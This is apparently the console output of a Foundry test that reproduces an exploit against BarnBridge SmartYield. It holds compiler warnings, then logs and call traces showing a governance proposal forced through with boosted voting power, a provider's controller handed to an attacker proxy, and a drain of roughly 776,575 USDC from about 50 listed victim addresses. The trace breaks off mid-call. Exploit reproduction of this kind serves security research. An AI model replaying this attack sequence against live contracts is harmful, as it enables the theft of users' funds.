Compiling 23 files with Solc 0.8.34
Solc 0.8.34 finished in 505.52ms
Compiler run successful with warnings:
  --> basetest.sol:87:5:
87 |     modifier balanceLog() virtual {

2261 |         assembly {

2281 |         assembly {

2304 |         assembly {

2322 |         assembly {

2345 |         assembly {

2363 |         assembly {

2386 |         assembly {

2406 |         assembly {

2432 |         assembly {

2452 |         assembly {

2475 |         assembly {

2493 |         assembly {

2516 |         assembly {

2534 |         assembly {

2557 |         assembly {

2577 |         assembly {

2603 |         assembly {

2623 |         assembly {

2646 |         assembly {

2664 |         assembly {

2687 |         assembly {

2705 |         assembly {

2728 |         assembly {

2748 |         assembly {

2774 |         assembly {

2796 |         assembly {

2822 |         assembly {

2844 |         assembly {

2870 |         assembly {

2892 |         assembly {

2918 |         assembly {

2942 |         assembly {

2971 |         assembly {

2992 |         assembly {

3007 |         assembly {

3023 |         assembly {

3038 |         assembly {

3054 |         assembly {

3069 |         assembly {

3087 |         assembly {

3112 |         assembly {

3130 |         assembly {

3145 |         assembly {

3161 |         assembly {

3176 |         assembly {

3192 |         assembly {

3207 |         assembly {

3225 |         assembly {

3250 |         assembly {

3268 |         assembly {

3283 |         assembly {

3299 |         assembly {

3314 |         assembly {

3330 |         assembly {

3345 |         assembly {

3363 |         assembly {

3388 |         assembly {

3408 |         assembly {

3433 |         assembly {

3453 |         assembly {

3478 |         assembly {

3498 |         assembly {

3523 |         assembly {

3545 |         assembly {

3573 |         assembly {

3593 |         assembly {

3608 |         assembly {

3624 |         assembly {

3639 |         assembly {

3655 |         assembly {

3670 |         assembly {

3688 |         assembly {

3713 |         assembly {

3731 |         assembly {

3746 |         assembly {

3762 |         assembly {

3777 |         assembly {

3793 |         assembly {

3808 |         assembly {

3826 |         assembly {

3851 |         assembly {

3869 |         assembly {

3884 |         assembly {

3900 |         assembly {

3915 |         assembly {

3931 |         assembly {

3946 |         assembly {

3964 |         assembly {

3989 |         assembly {

4009 |         assembly {

4034 |         assembly {

4054 |         assembly {

4079 |         assembly {

4099 |         assembly {

4124 |         assembly {

4146 |         assembly {

4174 |         assembly {

4194 |         assembly {

4209 |         assembly {

4225 |         assembly {

4240 |         assembly {

4256 |         assembly {

4271 |         assembly {

4289 |         assembly {

4314 |         assembly {

4332 |         assembly {

4347 |         assembly {

4363 |         assembly {


Ran 1 test for test/BarnBridgeSmartYield_exp.sol:BarnBridgeSmartYield_exp
[PASS] testExploit() (gas: 2699204)
Logs:
  Attacker Before exploit USDC Balance: 0.000000
  Attacker raw BOND staked        : 32000.000000000000000000
  Proposal #14 quorum (40% raw)   : 58404.319210739852197700
  Attacker voting power (lock ~2x) : 63824.170471841704704000
  ACCESS OBTAINED: CompoundProvider.controller flipped to the attacker proxy via execute(#14)
  Attacker USDC profit            : 776575.547933
    batch #1 (50 victims)         : 774943.379409
    batch #2 (42 victims)         : 1632.168524
  Attacker After exploit USDC Balance: 776575.547933

Traces:
  [3190204] BarnBridgeSmartYield_exp::testExploit()
    ├─ [10370] USDC::symbol() [staticcall]
    │   ├─ [3081] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::symbol() [delegatecall]
    │   │   └─ ← [Return] "USDC"
    │   └─ ← [Return] "USDC"
    ├─ [3339] USDC::balanceOf(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1]) [staticcall]
    │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [3164] USDC::decimals() [staticcall]
    │   ├─ [2381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit USDC Balance", val: 0, decimals: 6)
    ├─ [0] VM::label(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], "Attacker")
    │   └─ ← [Return]
    ├─ [0] VM::label(AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580], "AttackerControllerProxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], "CompoundProvider_bb_cUSDC")
    │   └─ ← [Return]
    ├─ [0] VM::label(OldLegitController: [0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3], "OldLegitController")
    │   └─ ← [Return]
    ├─ [0] VM::label(BarnBridgeGovernance: [0x4cAE362D7F227e3d306f70ce4878E245563F3069], "BarnBridgeGovernance")
    │   └─ ← [Return]
    ├─ [0] VM::label(Barn_staking: [0x10e138877df69Ca44Fdc68655f86c88CDe142D7F], "Barn_staking")
    │   └─ ← [Return]
    ├─ [0] VM::label(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], "USDC")
    │   └─ ← [Return]
    ├─ [17343] Barn_staking::balanceAtTs(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], 1783498523 [1.783e9]) [staticcall]
    │   ├─ [12387] 0xA62dA56e9a330646386365dC6B2945b5C4d120ed::balanceAtTs(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], 1783498523 [1.783e9]) [delegatecall]
    │   │   └─ ← [Return] 32000000000000000000000 [3.2e22]
    │   └─ ← [Return] 32000000000000000000000 [3.2e22]
    ├─ [8265] Barn_staking::votingPowerAtTs(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], 1783498523 [1.783e9]) [staticcall]
    │   ├─ [5809] 0xA62dA56e9a330646386365dC6B2945b5C4d120ed::votingPowerAtTs(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], 1783498523 [1.783e9]) [delegatecall]
    │   │   └─ ← [Return] 63824170471841704704000 [6.382e22]
    │   └─ ← [Return] 63824170471841704704000 [6.382e22]
    ├─ [55331] BarnBridgeGovernance::getProposalQuorum(14) [staticcall]
    │   ├─ [43379] Barn_staking::bondStakedAtTs(1783498522 [1.783e9]) [staticcall]
    │   │   ├─ [40926] 0xA62dA56e9a330646386365dC6B2945b5C4d120ed::bondStakedAtTs(1783498522 [1.783e9]) [delegatecall]
    │   │   │   └─ ← [Return] 146010798026849630494251 [1.46e23]
    │   │   └─ ← [Return] 146010798026849630494251 [1.46e23]
    │   └─ ← [Return] 58404319210739852197700 [5.84e22]
    ├─ emit log_named_decimal_uint(key: "Attacker raw BOND staked        ", val: 32000000000000000000000 [3.2e22], decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Proposal #14 quorum (40% raw)   ", val: 58404319210739852197700 [5.84e22], decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker voting power (lock ~2x) ", val: 63824170471841704704000 [6.382e22], decimals: 18)
    ├─ [0] VM::assertLt(32000000000000000000000 [3.2e22], 58404319210739852197700 [5.84e22], "raw stake alone should be BELOW quorum") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertGt(63824170471841704704000 [6.382e22], 58404319210739852197700 [5.84e22], "lock multiplier should push voting power ABOVE quorum") [staticcall]
    │   └─ ← [Return]
    ├─ [35385] BarnBridgeGovernance::state(14) [staticcall]
    │   ├─ [7379] Barn_staking::bondStakedAtTs(1783498522 [1.783e9]) [staticcall]
    │   │   ├─ [6926] 0xA62dA56e9a330646386365dC6B2945b5C4d120ed::bondStakedAtTs(1783498522 [1.783e9]) [delegatecall]
    │   │   │   └─ ← [Return] 146010798026849630494251 [1.46e23]
    │   │   └─ ← [Return] 146010798026849630494251 [1.46e23]
    │   ├─ [4051] Barn_staking::bondStakedAtTs(1783757806 [1.783e9]) [staticcall]
    │   │   ├─ [3598] 0xA62dA56e9a330646386365dC6B2945b5C4d120ed::bondStakedAtTs(1783757806 [1.783e9]) [delegatecall]
    │   │   │   └─ ← [Return] 213848798026849630494251 [2.138e23]
    │   │   └─ ← [Return] 213848798026849630494251 [2.138e23]
    │   └─ ← [Return] 6
    ├─ [0] VM::assertEq(6, 6, "#14 must be executable (Grace)") [staticcall]
    │   └─ ← [Return]
    ├─ [2458] CompoundProvider_bb_cUSDC::controller() [staticcall]
    │   └─ ← [Return] OldLegitController: [0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3]
    ├─ [0] VM::assertEq(OldLegitController: [0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3], OldLegitController: [0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3], "pre: provider still trusts legit controller") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1])
    │   └─ ← [Return]
    ├─ [149949] BarnBridgeGovernance::execute(14)
    │   ├─ [7379] Barn_staking::bondStakedAtTs(1783498522 [1.783e9]) [staticcall]
    │   │   ├─ [6926] 0xA62dA56e9a330646386365dC6B2945b5C4d120ed::bondStakedAtTs(1783498522 [1.783e9]) [delegatecall]
    │   │   │   └─ ← [Return] 146010798026849630494251 [1.46e23]
    │   │   └─ ← [Return] 146010798026849630494251 [1.46e23]
    │   ├─ [2051] Barn_staking::bondStakedAtTs(1783757806 [1.783e9]) [staticcall]
    │   │   ├─ [1598] 0xA62dA56e9a330646386365dC6B2945b5C4d120ed::bondStakedAtTs(1783757806 [1.783e9]) [delegatecall]
    │   │   │   └─ ← [Return] 213848798026849630494251 [2.138e23]
    │   │   └─ ← [Return] 213848798026849630494251 [2.138e23]
    │   ├─ [80795] OldLegitController::yieldControllTo(AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580])
    │   │   ├─ [65117] CompoundProvider_bb_cUSDC::setController(AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580])
    │   │   │   ├─ [2471] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::comptroller() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000003d9819210a31b4961b30ef54be2aed79b9c9cd3b
    │   │   │   ├─ [5499] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::getCompAddress() [staticcall]
    │   │   │   │   ├─ [331] 0xBafE01ff935C7305907c33BF824352eE5979B526::getCompAddress() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c00e94cb662c3520282e6f5717214004a7f26888
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000c00e94cb662c3520282e6f5717214004a7f26888
    │   │   │   ├─ [8154] 0xc00e94Cb662C3520282E6f5717214004A7f26888::approve(OldLegitController: [0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3], 0)
    │   │   │   │   ├─ emit Approval(owner: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], spender: OldLegitController: [0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [471] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::comptroller() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000003d9819210a31b4961b30ef54be2aed79b9c9cd3b
    │   │   │   ├─ [999] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::getCompAddress() [staticcall]
    │   │   │   │   ├─ [331] 0xBafE01ff935C7305907c33BF824352eE5979B526::getCompAddress() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c00e94cb662c3520282e6f5717214004a7f26888
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000c00e94cb662c3520282e6f5717214004a7f26888
    │   │   │   ├─ [3123] 0xc00e94Cb662C3520282E6f5717214004A7f26888::allowance(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1123] 0xc00e94Cb662C3520282E6f5717214004A7f26888::allowance(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [23124] 0xc00e94Cb662C3520282E6f5717214004A7f26888::approve(AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   ├─ emit Approval(owner: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], spender: AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580], value: 79228162514264337593543950335 [7.922e28])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [5597] 0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840::setController(AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ emit ProposalExecuted(param0: 1421725562745757222456169954215430003609071425441 [1.421e48], param1: 0x000000000000000000000000000000000000000E)
    │   └─ ← [Stop]
    ├─ [458] CompoundProvider_bb_cUSDC::controller() [staticcall]
    │   └─ ← [Return] AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580]
    ├─ [0] VM::assertEq(AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580], AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580], "ACCESS: provider now trusts attacker proxy") [staticcall]
    │   └─ ← [Return]
    ├─ emit log_string(val: "ACCESS OBTAINED: CompoundProvider.controller flipped to the attacker proxy via execute(#14)")
    ├─ [276530] → new MaliciousControllerImpl@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 1379 bytes of code
    ├─ [0] VM::prank(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1])
    │   └─ ← [Return]
    ├─ [7429] AttackerControllerProxy::upgradeTo(MaliciousControllerImpl: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Stop]
    ├─ [1339] USDC::balanceOf(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1]) [staticcall]
    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::startPrank(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1])
    │   └─ ← [Return]
    ├─ [1405503] AttackerControllerProxy::drain(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], [0x20C76D4203BF7490615804FE4fe9B132EE3E0935, 0xe77884CDdF148DD5f0e9191B33D8dBAdDB16DFB5, 0x71F12a5b0E60d2Ff8A87FD34E7dcff3c10c914b0, 0xB1C120957a5b5C45A15fd6e5E17f5A2B70bF49d0, 0x2d92441144E294d8eCEd55838d7665D04d64eA09, 0x0D4C7Abf6A1FBcBF4DbE7B98D4e1af26D5165cB0, 0xB8e4f6DEDFa4D4063D465536Bcb5926744319C69, 0x5d368c382Ae92FBA52233B95C633C96FE49D0Dc5, 0xAEbe2c167392E4b0d3e150ca80204eB327Db918b, 0x8FE02545E479Aa8bA77D84E51b1D9Ca17B88011A, 0xA8192F71f0Ec42Bf8cA501E80475E2287Ee54EB1, 0x0fe43549413276E5b2dA467f979FEe18f830fC4E, 0xd0dC07B98769f23A7BDbef15A35Faa256CB65dCF, 0x6621295A7fAdD3AB78aE6915502bD50fDd5A1491, 0xfA006a18F847bf45f67BCe08e2312149B254B59E, 0xe22289fC90d684b704c89D2ef0416bE2dcb509a4, 0x8548c1709184f052D2917f69df09676EAF759864, 0xDA57009d183fF7e2a4DA0f552a801FFd440a3e23, 0x67BC76E8Fd78CC59594C9F43C643eA7CAfA48669, 0xEf76BA56b914F9aF2FeC156F3c4408E111999db4, 0x7e5F578d0E4c43aE5C06A19BFB43A539A8908C87, 0x2D59d742cCe3a02E6A13958019F1A73EFDf66C11, 0x4efF3562075C5D2d9cb608139eC2fE86907005Fa, 0xfb0Cc36F27a28cc19C86C156091E2BEe7B2F6b69, 0xfFd70ED81Bd9eeFe8D0ef4cBbfAfb40C234Ff957, 0xB3b1A1193a0B7B48B46eFC3c86B614B152c257D5, 0xF2aE3d7C03E2e77536C17E3F0FCaCc612F0180Fa, 0x29b64F5D95a71B79874c4B5192c371BEa4B899cE, 0xc192F75bcb64D2E4f7e444A8E6fe8c3729728086, 0x0524Fe637b77A6F5f0b3a024f7fD9Fe1E688A291, 0x64c9677Ea9ad52263A319faaA226AA436541913F, 0x9cB8CF9Cc2C181cBfAd055838B3a7efC6755f32D, 0x3724583Ad51c8f7c4aB168dDcD185681Db07Baa5, 0x1cc3f09D7C971562F9d0Afbe4D0ee152b0fd2744, 0x7BB24F9ae8843590FABF42e049577e2ba68AFa0E, 0xF099D09c723D1a98a9C4853f0C025914aA040fB7, 0x67DA405C030d107d18510B5Ad708A34218C9c355, 0x0CfA0B89383fe30602240EFa1a2e1380f9090c3d, 0x8e9B650B79bd28f324f5B26D6dDBA594eb237cDf, 0x368C4E8933cf3577CcC394b4e05b4E03691493f1, 0x3aA8Ac0E6C1Fb9CBb733565De16cdC5a676bCb04, 0x82005D65AEcb10D711399cdDf8F39c553881bCe4, 0x80B3153F39Aeec1EF68Adc038913698e103E6e1d, 0x9757400188F2F54b83ac4dC290aB89dde526da10, 0xEBdcA98d2980362F1fA6eAd905a97F2F256F2a5c, 0x104D86705c46e9422B803AF522b43809f1C8e4e9, 0x473C6494180ad9Cd726f8a7a51cF8e88Bbf72bc6, 0xB152e2351c2209Ef82cB475f8D7D8693509C69e5, 0x3A3fe1cB66728282116802306093E327477CBbf1, 0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A], [125628402942 [1.256e11], 100149478376 [1.001e11], 85660000000 [8.566e10], 78218427082 [7.821e10], 77630290322 [7.763e10], 43879660608 [4.387e10], 32704854042 [3.27e10], 29166670000 [2.916e10], 27049579767 [2.704e10], 26850000545 [2.685e10], 19348506496 [1.934e10], 18959940181 [1.895e10], 17545367853 [1.754e10], 11246980747 [1.124e10], 10251274494 [1.025e10], 8989972550 [8.989e9], 8235731775 [8.235e9], 6783992746 [6.783e9], 6666000000 [6.666e9], 5176458883 [5.176e9], 4337882902 [4.337e9], 3813873030 [3.813e9], 3711143164 [3.711e9], 2962735598 [2.962e9], 2846074509 [2.846e9], 2420236289 [2.42e9], 1956211692 [1.956e9], 1797009856 [1.797e9], 1507648714 [1.507e9], 1156545383 [1.156e9], 1135687624 [1.135e9], 945253426 [9.452e8], 617672669 [6.176e8], 606000444 [6.06e8], 567838463 [5.678e8], 486697202 [4.866e8], 471216002 [4.712e8], 401000100 [4.01e8], 400450100 [4.004e8], 371438100 [3.714e8], 300000000 [3e8], 286617638 [2.866e8], 254708346 [2.547e8], 250789006 [2.507e8], 218437332 [2.184e8], 212919326 [2.129e8], 206275557 [2.062e8], 200000000 [2e8], 198639621 [1.986e8], 160787907 [1.607e8]])
    │   ├─ [1404462] MaliciousControllerImpl::drain(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], [0x20C76D4203BF7490615804FE4fe9B132EE3E0935, 0xe77884CDdF148DD5f0e9191B33D8dBAdDB16DFB5, 0x71F12a5b0E60d2Ff8A87FD34E7dcff3c10c914b0, 0xB1C120957a5b5C45A15fd6e5E17f5A2B70bF49d0, 0x2d92441144E294d8eCEd55838d7665D04d64eA09, 0x0D4C7Abf6A1FBcBF4DbE7B98D4e1af26D5165cB0, 0xB8e4f6DEDFa4D4063D465536Bcb5926744319C69, 0x5d368c382Ae92FBA52233B95C633C96FE49D0Dc5, 0xAEbe2c167392E4b0d3e150ca80204eB327Db918b, 0x8FE02545E479Aa8bA77D84E51b1D9Ca17B88011A, 0xA8192F71f0Ec42Bf8cA501E80475E2287Ee54EB1, 0x0fe43549413276E5b2dA467f979FEe18f830fC4E, 0xd0dC07B98769f23A7BDbef15A35Faa256CB65dCF, 0x6621295A7fAdD3AB78aE6915502bD50fDd5A1491, 0xfA006a18F847bf45f67BCe08e2312149B254B59E, 0xe22289fC90d684b704c89D2ef0416bE2dcb509a4, 0x8548c1709184f052D2917f69df09676EAF759864, 0xDA57009d183fF7e2a4DA0f552a801FFd440a3e23, 0x67BC76E8Fd78CC59594C9F43C643eA7CAfA48669, 0xEf76BA56b914F9aF2FeC156F3c4408E111999db4, 0x7e5F578d0E4c43aE5C06A19BFB43A539A8908C87, 0x2D59d742cCe3a02E6A13958019F1A73EFDf66C11, 0x4efF3562075C5D2d9cb608139eC2fE86907005Fa, 0xfb0Cc36F27a28cc19C86C156091E2BEe7B2F6b69, 0xfFd70ED81Bd9eeFe8D0ef4cBbfAfb40C234Ff957, 0xB3b1A1193a0B7B48B46eFC3c86B614B152c257D5, 0xF2aE3d7C03E2e77536C17E3F0FCaCc612F0180Fa, 0x29b64F5D95a71B79874c4B5192c371BEa4B899cE, 0xc192F75bcb64D2E4f7e444A8E6fe8c3729728086, 0x0524Fe637b77A6F5f0b3a024f7fD9Fe1E688A291, 0x64c9677Ea9ad52263A319faaA226AA436541913F, 0x9cB8CF9Cc2C181cBfAd055838B3a7efC6755f32D, 0x3724583Ad51c8f7c4aB168dDcD185681Db07Baa5, 0x1cc3f09D7C971562F9d0Afbe4D0ee152b0fd2744, 0x7BB24F9ae8843590FABF42e049577e2ba68AFa0E, 0xF099D09c723D1a98a9C4853f0C025914aA040fB7, 0x67DA405C030d107d18510B5Ad708A34218C9c355, 0x0CfA0B89383fe30602240EFa1a2e1380f9090c3d, 0x8e9B650B79bd28f324f5B26D6dDBA594eb237cDf, 0x368C4E8933cf3577CcC394b4e05b4E03691493f1, 0x3aA8Ac0E6C1Fb9CBb733565De16cdC5a676bCb04, 0x82005D65AEcb10D711399cdDf8F39c553881bCe4, 0x80B3153F39Aeec1EF68Adc038913698e103E6e1d, 0x9757400188F2F54b83ac4dC290aB89dde526da10, 0xEBdcA98d2980362F1fA6eAd905a97F2F256F2a5c, 0x104D86705c46e9422B803AF522b43809f1C8e4e9, 0x473C6494180ad9Cd726f8a7a51cF8e88Bbf72bc6, 0xB152e2351c2209Ef82cB475f8D7D8693509C69e5, 0x3A3fe1cB66728282116802306093E327477CBbf1, 0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A], [125628402942 [1.256e11], 100149478376 [1.001e11], 85660000000 [8.566e10], 78218427082 [7.821e10], 77630290322 [7.763e10], 43879660608 [4.387e10], 32704854042 [3.27e10], 29166670000 [2.916e10], 27049579767 [2.704e10], 26850000545 [2.685e10], 19348506496 [1.934e10], 18959940181 [1.895e10], 17545367853 [1.754e10], 11246980747 [1.124e10], 10251274494 [1.025e10], 8989972550 [8.989e9], 8235731775 [8.235e9], 6783992746 [6.783e9], 6666000000 [6.666e9], 5176458883 [5.176e9], 4337882902 [4.337e9], 3813873030 [3.813e9], 3711143164 [3.711e9], 2962735598 [2.962e9], 2846074509 [2.846e9], 2420236289 [2.42e9], 1956211692 [1.956e9], 1797009856 [1.797e9], 1507648714 [1.507e9], 1156545383 [1.156e9], 1135687624 [1.135e9], 945253426 [9.452e8], 617672669 [6.176e8], 606000444 [6.06e8], 567838463 [5.678e8], 486697202 [4.866e8], 471216002 [4.712e8], 401000100 [4.01e8], 400450100 [4.004e8], 371438100 [3.714e8], 300000000 [3e8], 286617638 [2.866e8], 254708346 [2.547e8], 250789006 [2.507e8], 218437332 [2.184e8], 212919326 [2.129e8], 206275557 [2.062e8], 200000000 [2e8], 198639621 [1.986e8], 160787907 [1.607e8]]) [delegatecall]
